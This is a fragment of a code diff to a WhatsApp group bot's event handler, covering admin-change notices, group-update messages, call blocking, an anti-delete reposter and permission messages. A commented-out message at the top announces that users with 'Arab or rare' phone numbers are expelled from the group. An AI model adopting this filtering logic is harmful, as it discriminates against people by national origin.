+              // await m.conn.sendMessage(id, {text: `*[❗] @${user.split('@')[0]} ᴇɴ ᴇsᴛᴇ ɢʀᴜᴘᴏ ɴᴏ sᴇ ᴘᴇʀᴍɪᴛᴇɴ ɴᴜᴍᴇʀᴏs ᴀʀᴀʙᴇs ᴏ ʀᴀʀᴏs, ᴘᴏʀ ʟᴏ ϙᴜᴇ sᴇ ᴛᴇ sᴀᴄᴀʀᴀ ᴅᴇʟ ɢʀᴜᴘᴏ*`, mentions: [user]}, {quoted: fkontak2});
+              // return;
+            // }
+            // await m.conn.sendFile(id, apii.data, 'pp.jpg', text, null, false, {mentions: [user]});
+          // }
+        // }
+      // }
+      // break;
     case 'promote':
     case 'daradmin':
     case 'darpoder':
-      text = (chat.sPromote || tradutor.texto3 || conn?.spromote || '@user ```is now Admin```');
+      text = (chat.sPromote || this.spromote || conn.spromote || '@user ```is now Admin```');
     case 'demote':
     case 'quitarpoder':
     case 'quitaradmin':
       if (!text) {
-        text = (chat?.sDemote || tradutor.texto4 || conn?.sdemote || '@user ```is no longer Admin```');
+        text = (chat.sDemote || this.sdemote || conn.sdemote || '@user ```is no longer Admin```');
       }
       text = text.replace('@user', '@' + participants[0].split('@')[0]);
       if (chat.detect && !chat?.isBanned) {
-        mconn?.conn?.sendMessage(id, { text, mentions: mconn?.conn?.parseMention(text) });
+        mconn.conn.sendMessage(id, {text, mentions: mconn.conn.parseMention(text)});
       }
       break;
   }
@@ -1134,13 +1746,9 @@ export async function participantsUpdate({ id, participants, action }) {
 
 /**
  * Handle groups update
- * @param {import("baileys").BaileysEventMap<unknown>['groups.update']} groupsUpdate
+ * @param {import('@whiskeysockets/baileys').BaileysEventMap<unknown>['groups.update']} groupsUpdate
  */
 export async function groupsUpdate(groupsUpdate) {
-  const idioma = global.db.data.chats[groupsUpdate[0].id]?.language || global.defaultLenguaje;
-  const _translate = JSON.parse(fs.readFileSync(`./src/languages/${idioma}.json`))
-  const tradutor = _translate.handler.participantsUpdate
-
   if (opts['self']) {
     return;
   }
@@ -1149,29 +1757,28 @@ export async function groupsUpdate(groupsUpdate) {
     if (!id) continue;
     if (groupUpdate.size == NaN) continue;
     if (groupUpdate.subjectTime) continue;
-    const chats = global.db.data.chats[id]; 
-    let text = '';
+    const chats = global.db.data.chats[id]; let text = '';
     if (!chats?.detect) continue;
-    if (groupUpdate?.desc) text = (chats?.sDesc || tradutor.texto5 || conn?.sDesc || '```Description has been changed to```\n@desc').replace('@desc', groupUpdate.desc);
-    if (groupUpdate?.subject) text = (chats?.sSubject || tradutor.texto6 || conn?.sSubject || '```Subject has been changed to```\n@subject').replace('@subject', groupUpdate.subject);
-    if (groupUpdate?.icon) text = (chats?.sIcon || tradutor.texto7 || conn?.sIcon || '```Icon has been changed to```').replace('@icon', groupUpdate.icon);
-    if (groupUpdate?.revoke) text = (chats?.sRevoke || tradutor.texto8 || conn?.sRevoke || '```Group link has been changed to```\n@revoke').replace('@revoke', groupUpdate.revoke);
+    if (groupUpdate.desc) text = (chats.sDesc || this.sDesc || conn.sDesc || '```Description has been changed to```\n@desc').replace('@desc', groupUpdate.desc);
+    if (groupUpdate.subject) text = (chats.sSubject || this.sSubject || conn.sSubject || '```Subject has been changed to```\n@subject').replace('@subject', groupUpdate.subject);
+    if (groupUpdate.icon) text = (chats.sIcon || this.sIcon || conn.sIcon || '```Icon has been changed to```').replace('@icon', groupUpdate.icon);
+    if (groupUpdate.revoke) text = (chats.sRevoke || this.sRevoke || conn.sRevoke || '```Group link has been changed to```\n@revoke').replace('@revoke', groupUpdate.revoke);
     if (!text) continue;
-    await mconn?.conn?.sendMessage(id, { text, mentions: mconn?.conn?.parseMention(text) });
+    await mconn.conn.sendMessage(id, {text, mentions: mconn.conn.parseMention(text)});
   }
 }
 
 export async function callUpdate(callUpdate) {
-  const isAnticall = global?.db?.data?.settings[mconn?.conn?.user?.jid].antiCall;
+  const isAnticall = global.db.data.settings[mconn.conn.user.jid].antiCall;
   if (!isAnticall) return;
   for (const nk of callUpdate) {
     if (nk.isGroup == false) {
       if (nk.status == 'offer') {
-        const callmsg = await mconn?.conn?.reply(nk.from, `Hola *@${nk.from.split('@')[0]}*, las ${nk.isVideo ? 'videollamadas' : 'llamadas'} no están permitidas, serás bloqueado.\n-\nSi accidentalmente llamaste póngase en contacto con mi creador para que te desbloquee!`, false, { mentions: [nk.from] });
+        const callmsg = await mconn.conn.reply(nk.from, `Hola *@${nk.from.split('@')[0]}*, las ${nk.isVideo ? 'videollamadas' : 'llamadas'} no están permitidas, serás bloqueado.\n-\nSi accidentalmente llamaste póngase en contacto con mi creador para que te desbloquee!`, false, {mentions: [nk.from]});
         // let data = global.owner.filter(([id, isCreator]) => id && isCreator)
         // await this.sendContact(nk.from, data.map(([id, name]) => [id, name]), false, { quoted: callmsg })
         const vcard = `BEGIN:VCARD\nVERSION:3.0\nN:;𝐁𝐫𝐮𝐧𝐨 𝐒𝐨𝐛𝐫𝐢𝐧𝐨 👑;;;\nFN:𝐁𝐫𝐮𝐧𝐨 𝐒𝐨𝐛𝐫𝐢𝐧𝐨 👑\nORG:𝐁𝐫𝐮𝐧𝐨 𝐒𝐨𝐛𝐫𝐢𝐧𝐨 👑\nTITLE:\nitem1.TEL;waid=5219992095479:+521 999 209 5479\nitem1.X-ABLabel:𝐁𝐫𝐮𝐧𝐨 𝐒𝐨𝐛𝐫𝐢𝐧𝐨 👑\nX-WA-BIZ-DESCRIPTION:[❗] ᴄᴏɴᴛᴀᴄᴛᴀ ᴀ ᴇsᴛᴇ ɴᴜᴍ ᴘᴀʀᴀ ᴄᴏsᴀs ɪᴍᴘᴏʀᴛᴀɴᴛᴇs.\nX-WA-BIZ-NAME:𝐁𝐫𝐮𝐧𝐨 𝐒𝐨𝐛𝐫𝐢𝐧𝐨 👑\nEND:VCARD`;
-        await mconn.conn.sendMessage(nk.from, { contacts: { displayName: '𝐁𝐫𝐮𝐧𝐨 𝐒𝐨𝐛𝐫𝐢𝐧𝐨 👑', contacts: [{ vcard }] } }, { quoted: callmsg });
+        await mconn.conn.sendMessage(nk.from, {contacts: {displayName: '𝐁𝐫𝐮𝐧𝐨 𝐒𝐨𝐛𝐫𝐢𝐧𝐨 👑', contacts: [{vcard}]}}, {quoted: callmsg});
         await mconn.conn.updateBlockStatus(nk.from, 'block');
       }
     }
@@ -1179,58 +1786,46 @@ export async function callUpdate(callUpdate) {
 }
 
 export async function deleteUpdate(message) {
-  const datas = global
-  const id = message?.participant 
-  const idioma = datas.db.data.users[id]?.language || global.defaultLenguaje;
-  const _translate = JSON.parse(fs.readFileSync(`./src/languages/${idioma}.json`))
-  const tradutor = _translate.handler.deleteUpdate
-
-
-  let d = new Date(new Date + 3600000)
-  let date = d.toLocaleDateString('es', { day: 'numeric', month: 'long', year: 'numeric' })
-  let time = d.toLocaleString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true })
-  try {
-    const { fromMe, id, participant } = message
-    if (fromMe) return
-    let msg = mconn.conn.serializeM(mconn.conn.loadMessage(id))
-    let chat = global.db.data.chats[msg?.chat] || {}
-    if (!chat?.antidelete) return
-    if (!msg) return
-    if (!msg?.isGroup) return
-    const antideleteMessage = `${tradutor.texto1[0]}
-${tradutor.texto1[1]} @${participant.split`@`[0]}
-${tradutor.texto1[2]} ${time}
-${tradutor.texto1[3]} ${date}\n
-${tradutor.texto1[4]}
-${tradutor.texto1[5]}`.trim();
-    await mconn.conn.sendMessage(msg.chat, { text: antideleteMessage, mentions: [participant] }, { quoted: msg })
-    mconn.conn.copyNForward(msg.chat, msg).catch(e => console.log(e, msg))
-  } catch (e) {
-    console.error(e)
-  }
+let d = new Date(new Date + 3600000)
+let date = d.toLocaleDateString('es', { day: 'numeric', month: 'long', year: 'numeric' })
+ let time = d.toLocaleString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true })
+    try {
+        const { fromMe, id, participant } = message
+        if (fromMe) return 
+        let msg = mconn.conn.serializeM(mconn.conn.loadMessage(id))
+	let chat = global.db.data.chats[msg?.chat] || {}
+	if (!chat?.antidelete) return 
+        if (!msg) return 
+	if (!msg?.isGroup) return 
+	const antideleteMessage = `_*< ANTI-DELETE />*_\n
+ ▢ *Usuario:* @${participant.split`@`[0]}
+ ▢ *Hora:* ${time}
+ ▢ *Fecha:* ${date}\n
+ ▢ *Enviando el mensaje eliminado...*\n
+ *[ ℹ️ ] Para desactivar la función* _antidelete_*, envia el siguiente comando:* _/disable antidelete_`.trim();
+        await mconn.conn.sendMessage(msg.chat, {text: antideleteMessage, mentions: [participant]}, {quoted: msg})
+        mconn.conn.copyNForward(msg.chat, msg).catch(e => console.log(e, msg))
+    } catch (e) {
+        console.error(e)
+    }
 }
 
 global.dfail = (type, m, conn) => {
-  const datas = global
-  const idioma = datas.db.data.users[m.sender].language || global.defaultLenguaje;
-  const _translate = JSON.parse(fs.readFileSync(`./src/languages/${idioma}.json`))
-  const tradutor = _translate.handler.dfail
-
   const msg = {
-    rowner: tradutor.texto1,
-    owner: tradutor.texto2,
-    mods: tradutor.texto3,
-    premium: tradutor.texto4,
-    group: tradutor.texto5,
-    private: tradutor.texto6,
-    admin: tradutor.texto7,
-    botAdmin: tradutor.texto8,
-    unreg: tradutor.texto9,
-    restrict: tradutor.texto10,
+    rowner: '*[ ℹ️ ] This command can only be used by the bot owner.*',
+    owner: '*[ ℹ️ ] This command can only be used by the bot owner.*',
+    mods: '*[ ℹ️ ] This command can only be used by moderators and the bot owner.*',
+    premium: '*[ ℹ️ ] This command can only be used by premium users and the bot owner.*',
+    group: '*[ ℹ️ ] This command can only be used in groups.*',
+    private: '*[ ℹ️ ] This command can only be used in the bot private chat.*',
+    admin: '*[ ℹ️ ] This command can only be used by group administrators.*',
+    botAdmin: '*[ ℹ️ ] To use this command it is necessary that the bot be an administrator of the group.*',
+    unreg: '*[ ℹ️ ] To use this command you must be registered.*\n\n*[ 💡 ] Use the command:* _/verify name.age_ *to register.*',
+    restrict: '*[ ℹ️ ] This command was disabled by the bot owner.*',
   }[type];
-  const aa = { quoted: m, userJid: conn.user.jid };
-  const prep = generateWAMessageFromContent(m.chat, { extendedTextMessage: { text: msg, contextInfo: { externalAdReply: { title: tradutor.texto11[0], body: tradutor.texto11[1], thumbnail: imagen1, sourceUrl: tradutor.texto11[2] } } } }, aa);
-  if (msg) return conn.relayMessage(m.chat, prep.message, { messageId: prep.key.id });
+  const aa = {quoted: m, userJid: conn.user.jid};
+  const prep = generateWAMessageFromContent(m.chat, {extendedTextMessage: {text: msg, contextInfo: {externalAdReply: {title: '*[ ⚠ ] Warning*', body: 'ᴍɪᴢᴛʏ - ʙᴏᴛ', thumbnail: imagen1, sourceUrl: 'https://wa.me/94701337346'}}}}, aa);
+  if (msg) return conn.relayMessage(m.chat, prep.message, {messageId: prep.key.id});
 };
 
 const file = global.__filename(import.meta.url, true);
@@ -1238,11 +1833,12 @@ watchFile(file, async () => {
   unwatchFile(file);
   console.log(chalk.redBright('Update \'handler.js\''));
   if (global.reloadHandler) console.log(await global.reloadHandler());
-
-  if (global.conns && global.conns.length > 0) {
+  
+  if (global.conns && global.conns.length > 0 ) {
     const users = [...new Set([...global.conns.filter((conn) => conn.user && conn.ws.socket && conn.ws.socket.readyState !== ws.CLOSED).map((conn) => conn)])];
     for (const userr of users) {
       userr.subreloadHandler(false)
     }
   }
+  
 });
